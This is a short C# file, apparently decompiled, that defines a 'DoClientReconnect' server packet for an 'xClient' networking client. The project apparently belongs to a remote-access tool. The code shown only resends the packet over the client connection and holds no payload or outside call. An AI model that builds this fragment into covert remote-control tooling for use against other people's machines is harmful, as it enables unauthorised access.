using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000DF RID: 223
	[Serializable]
	public class DoClientReconnect : IPacket
	{
		// Token: 0x0600059C RID: 1436 RVA: 0x00004AF3 File Offset: 0x00002CF3
		public void Execute(Client client)
		{
			client.Send<DoClientReconnect>(this);
		}
	}
}
